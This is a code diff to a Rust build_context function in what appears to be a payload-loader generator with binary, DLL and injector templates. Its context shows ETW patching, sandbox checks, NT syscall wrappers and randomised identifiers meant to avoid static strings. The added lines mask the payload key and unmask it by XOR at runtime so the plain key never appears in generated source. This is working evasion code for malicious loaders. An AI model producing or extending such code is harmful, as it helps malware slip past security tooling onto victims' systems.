@@ -253,6 +253,8 @@ fn build_context(config: &LoaderConfig) -> Context {
     for k in &["fn_etw", "fn_etw_patch", "fn_sandbox", "fn_build_str", "fn_getexport"] {
         vars.insert(k, rand_ident(10));
     }
+    // Rust PE template key-unmask loop variable
+    vars.insert("bin_lv_ki", rand_ident(6));
     // C# delegate variable names for NT syscall wrappers (must not be static strings)
     for k in &["fn_nt_alloc", "fn_nt_prot", "fn_nt_thread"] {
         vars.insert(k, rand_ident(10));
@@ -502,6 +504,18 @@ fn build_context(config: &LoaderConfig) -> Context {
         .map(|c| String::from_utf8_lossy(c).to_string())
         .collect();
     ctx.insert("key_chunks", &masked_key_chunks);
+
+    // Rust PE templates (binary/dll/injector) use masked_key_bytes directly as a [u8; N] literal
+    // and XOR-unmask at runtime with key_tweak — the plain key never appears in the source.
+    let masked_key_bytes: Vec<u32> = masked_key_hex
+        .as_bytes()
+        .chunks(2)
+        .map(|pair| {
+            let hex_str: String = pair.iter().map(|&b| b as char).collect();
+            u8::from_str_radix(&hex_str, 16).unwrap_or(0) as u32
+        })
+        .collect();
+    ctx.insert("masked_key_bytes", &masked_key_bytes);
 
     let feature_names: Vec<String> = config.features.iter()
         .map(|f| format!("{:?}", f))
